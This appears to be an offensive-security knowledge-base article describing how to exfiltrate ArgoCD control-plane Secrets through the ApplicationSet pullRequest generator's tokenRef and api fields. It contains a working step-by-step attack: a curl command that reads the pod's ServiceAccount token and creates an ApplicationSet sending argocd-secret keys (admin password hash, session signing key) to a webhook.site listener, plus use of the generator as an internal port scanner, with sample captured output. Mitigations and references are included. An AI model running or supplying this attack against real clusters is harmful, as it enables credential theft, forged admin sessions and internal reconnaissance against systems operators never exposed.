---
title: Secret Exfiltration via ApplicationSet Generators
description: Abusing the pullRequest generator's tokenRef to exfiltrate control-plane Secrets and probe internal services
category: offensive
phase: credential-access
createdAt: 2026-09-07
impact: An attacker who can create ApplicationSets can name any Secret in the argocd namespace in tokenRef and any URL in the generator api field. The ApplicationSet controller reads that Secret with its own identity and sends it as an Authorization Bearer header to the attacker listener. The same primitive forges ArgoCD admin sessions from server.secretkey and scans in-cluster services from the control plane network
mitigation:
  - >-
    Set `applicationsetcontroller.enable.tokenref.strict.mode` to `"true"` in `argocd-cmd-params-cm` so referenced Secrets must carry `argocd.argoproj.io/secret-type: scm-creds`. Label genuine SCM credential Secrets before enabling it
  - >-
    Set `applicationsetcontroller.allowed.scm.providers` to real SCM endpoints, or set `applicationsetcontroller.enable.scm.providers` to `"false"` if SCM and **pullRequest** generators are unused
  - >-
    Treat `create`, `update`, and `delete` on `applicationsets.argoproj.io` as administrative. Audit Kubernetes RBAC bindings and every `applicationsets` rule in `argocd-rbac-cm`, including pipeline ServiceAccounts
  - Reject generator `api` values outside an SCM allowlist and `tokenRef.secretName` values outside an operator allowlist with ValidatingAdmissionPolicy, Kyverno, or Gatekeeper, and restrict controller egress to those endpoints
mitreTechniques:
  - T1552
  - T1567
  - T1606
  - T1046
tools:
  - kubectl
references: |
  - [Compromising ArgoCD via Application Sync](/topics/compromising-argocd-via-application-sync)
  - [Weaponizing ArgoCD Application](/topics/weaponizing-argocd-application)
  - [Weaponizing Argo Workflows](/topics/weaponizing-argo-workflows)
  - [ApplicationSet security](https://argo-cd.readthedocs.io/en/stable/operator-manual/applicationset/Security/)
  - [Argo CD RBAC](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/)
  - [tokenRef strict mode for Pull Request generators](https://github.com/argoproj/argo-cd/pull/20309)
---

ArgoCD's ApplicationSet controller turns one template into many Applications. To talk to source control providers it needs credentials. Whoever writes the ApplicationSet names those credentials on the object. The controller then reads them, as itself, from the control plane namespace.

That is the whole technique. An attacker who can create a single ApplicationSet points the generator's `api` field at a listener they control and its `tokenRef` field at any Secret in the `argocd` namespace. The controller reads the Secret and puts it on an outbound request as `Authorization: Bearer <secret>`. The attacker reads it on their own listener.

This is not a memory corruption bug. The controller is a deputy. It acts on attacker input with authority the attacker does not have, and it never asks whether the person who wrote the object was allowed to read the Secret named in it.

## Understanding the attack surface

The **pullRequest** generator has two fields that matter here.

- **`api` is any URL.** The SCM endpoint to query. Plain `http` works. ClusterIPs work. The controller's own loopback works. A public webhook works too, because the chart's NetworkPolicies are ingress only and the controller egress is open by default.
- **`tokenRef` is any Secret key in `argocd`.** A `{secretName, key}` pair that names credentials for that endpoint. Any Secret in the `argocd` namespace, and any key inside it. There is no schema check on `key`, so keys that were never meant as SCM tokens are still reachable.

The controller reads that Secret with its own ServiceAccount. The Helm chart grants that account `get`, `list`, and `watch` on Secrets in `argocd`. It then sends a request like this.

```text
GET <api>/api/v3/repos/<owner>/<repo>/pulls?per_page=100
User-Agent: go-github/v69.2.0
Authorization: Bearer <value of the referenced secret key>
```

Two things follow. The header leaks whatever lives in the `argocd` namespace. The URL is a request the controller makes from inside the control plane, with egress left open. The chart's NetworkPolicies cover ingress only.

> [!IMPORTANT]
> The caller is never checked. Nothing asks whether the ApplicationSet's author could read the referenced Secret. The API server's create handler (`server/applicationset/applicationset.go`) validates the `project` field and enforces RBAC on the `applicationsets` resource. The strings `secret` and `token` do not appear in the file. The controller then resolves `tokenRef` on its own, during reconcile, as itself. Who wrote the object and who can read the Secret are separate questions.

The permission is one verb on one resource. What comes back includes the ArgoCD admin password hash and the server's session signing key.

## RBAC permissions

The attacker needs `create` on `applicationsets.argoproj.io` in the `argocd` namespace.

No other Kubernetes permission is required. Not `get`, `list`, or `watch` on `secrets`. Not any verb on `applications.argoproj.io`. Not `get`, `update`, `patch`, or `delete` on `applicationsets`. `get` only matters if they want to read results back from the object. An ArgoCD account or session is unnecessary when writing through the Kubernetes API.

```bash
kubectl -n argocd create role appset-creator \
  --verb=create --resource=applicationsets.argoproj.io
kubectl -n argocd create rolebinding appset-creator \
  --role=appset-creator --serviceaccount=tenant-ns:tenant
```

The ArgoCD chart does not ship a tenant role with this verb. A ServiceAccount bound to `edit` still gets forbidden, and SelfSubjectRulesReview lists no `argoproj.io` rules.

```text
applicationsets.argoproj.io is forbidden: User "system:serviceaccount:icarus-hunt:tenant"
cannot create resource "applicationsets" in API group "argoproj.io" in the namespace "argocd"
```

So the grant has to be given on purpose. In practice it lands on CI and GitOps ServiceAccounts that apply ApplicationSets as part of a pipeline, platform automation that provisions tenant Applications, and per team roles in self service ApplicationSet setups. Those identities are treated as ordinary automation, not as ArgoCD administrators. That is the gap this technique uses.

There is a second way in. ArgoCD's own RBAC (`argocd-rbac-cm`) treats `applicationsets` as a project scoped resource.

```text
p, role:tenant, applicationsets, create, tenantproj/*, allow
g, tenant-user, role:tenant
```

That principal has no Kubernetes credentials at all, and looks confined to `tenantproj`. The ArgoCD API server writes the object into the `argocd` namespace on their behalf. The RBAC documentation describes this grant as "effectively grants the ability to create Applications". It does not mention Secrets.

## The attack sequence

### Step 1. Use a public webhook

The controller fetches `api` itself, so any URL that logs request headers works. A public collector such as `https://webhook.site/<id>` is enough when the cluster can reach the internet. An in cluster Service still works if you already have a foothold.

### Step 2. Create the ApplicationSet

From the tenant pod, create the ApplicationSet with the automounted ServiceAccount token. Cluster admin kubectl and the controller identity are not required.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  https://kubernetes.default.svc/apis/argoproj.io/v1alpha1/namespaces/argocd/applicationsets \
  -d '{
  "apiVersion": "argoproj.io/v1alpha1",
  "kind": "ApplicationSet",
  "metadata": {"name": "hunt-pr"},
  "spec": {
    "generators": [{"pullRequest": {"github": {
      "owner": "hunting",
      "repo": "markers",
      "api": "https://webhook.site/<id>/",
      "tokenRef": {"secretName": "argocd-secret", "key": "admin.password"}
    }}}],
    "template": {
      "metadata": {"name": "gen-pr"},
      "spec": {
        "source": {"repoURL": "https://example.invalid/repo.git"},
        "destination": {"server": "https://kubernetes.default.svc", "namespace": "default"},
        "project": "default"
      }
    }
  }
}'
```

The template block is filler. The generator runs during reconcile, before any Application is rendered, so the template never has to be valid or reachable for the request to go out.

### Step 3. Collect the credential

webhook.site receives the controller's request with the Secret in the header.

```text
REQ GET /api/v3/repos/hunting/markers/pulls?per_page=100
User-Agent: go-github/v69.2.0
Authorization: Bearer <bcrypt hash equal to argocd-secret/admin.password>
```

The request comes from the ApplicationSet controller, not from the attacker. webhook.site sees the cluster's egress address.

The admin bcrypt hash can be cracked offline and used for an ArgoCD admin login.

### Step 4. Point tokenRef at a better key

`key` is unconstrained, so the same object can be pointed at anything in the Secret. Changing `tokenRef.key` to `server.secretkey` and waiting for the next reconcile returns the session signing key.

```text
Authorization: Bearer <argocd-secret/server.secretkey>
```

ArgoCD uses that key to sign API sessions. Anyone who has it can mint a valid admin session instead of cracking the password hash, and the API never sees a login.

Changing the object requires `update`, which the minimal grant does not include. An attacker who only has `create` gets the same result by creating a second ApplicationSet that names the other key.

### Step 5. Use the generator as a port probe

Leave `tokenRef` off and the `api` field is a request the controller makes from inside the control plane namespace.

```text
api: http://10.96.0.1:443
  → Get "http://10.96.0.1:443/api/v3/repos/h/r/pulls?per_page=100": 400  []

api: http://127.0.0.1:8080/metrics
  → GET http://127.0.0.1:8080/metrics/api/v3/repos/h/r/pulls?per_page=100: 404  []
```

The controller fetched the Kubernetes API ClusterIP and its own loopback metrics port. On managed clusters the same field reaches cloud instance metadata endpoints, subject to whatever hop limit or IMDSv2 posture the nodes carry.

Unreachable targets look different from reachable ones.

```text
api: http://10.255.255.1:7000
  → dial tcp 10.255.255.1:7000: i/o timeout, requeueAfter=30m0s
```

The 30 minute requeue makes this a slow scanner. Each new target needs a new object when the attacker only has `create`, and those objects pile up in the cluster.

### Step 6. Read the result

How much comes back depends on a second permission.

| Channel | Needs | Reveals |
| --- | --- | --- |
| Attacker listener | `create` only | Everything. Method, path, all headers, the Bearer value |
| ApplicationSet `status` conditions | `get` on applicationsets | Method, full URL, HTTP status code |
| Controller logs | log access | The same error string |

The credential leaves the cluster on the listener, so `create` alone is enough for that half. Using the generator only as an internal scanner is mostly blind without `get`.

How much of the response is visible is limited by the HTTP client. go-github v69.2.0's `CheckResponse` unmarshals the body into an `ErrorResponse`, and `ErrorResponse.Error()` prints the method, sanitised URL, status code, `Message`, and `Errors`. A probed endpoint that returns JSON with `message` or `errors` fields shows those in the ApplicationSet status condition. A body that is not JSON shows only the status code. A 2xx response returns no error, so a successful fetch produces no condition at all and is invisible on the object.

The controller log line puts the whole chain in one entry.

```text
level=error msg="error generating params" error="error listing repos: error listing pull requests
for hunting/markers: Get \"https://webhook.site/<id>/api/v3/repos/hunting/markers/
pulls?per_page=100\": EOF" ... TokenRef:&SecretRef{SecretName:argocd-secret,Key:admin.password,}
```

## ApplicationSet write is an admin capability

ArgoCD documents this outcome. The ApplicationSet security page states that generators can read Secrets in the ArgoCD namespace and send them to arbitrary URLs as auth headers. It calls that abuse by a malicious user, and it concludes that only admins may be given permission, via Kubernetes RBAC or any other mechanism, to create, update, or delete ApplicationSets.

The controller is built that way. It resolves `tokenRef` as itself, so the author's Secret permissions are never checked. The Helm chart grants that controller `get`, `list`, and `watch` on Secrets in `argocd`, and that is the privilege the deputy uses. `tokenRef` strict mode and the SCM provider allowlist exist and ship off, so a default install leaves the deputy unconstrained.

Upstream already treated the same leak as a bug. [tokenRef strict mode for Pull Request generators](https://github.com/argoproj/argo-cd/pull/20309) called it a defect when ApplicationSets may live in any namespace, because the creator there is a non-admin. The control plane namespace case was left to RBAC. A subject who already administers ArgoCD, or who holds the ApplicationSet controller ServiceAccount, already reads those Secrets directly, so the same request is collection rather than escalation.

A grant of `applicationsets` create is not a restricted automation identity. Combined with a default install, it lets that subject read every Secret in `argocd`. The same confused deputy shape appears in [Weaponizing Argo Workflows](/topics/weaponizing-argo-workflows) through `spec.serviceAccountName`, and in [Compromising ArgoCD via Application Sync](/topics/compromising-argocd-via-application-sync) through the `default` **AppProject**.
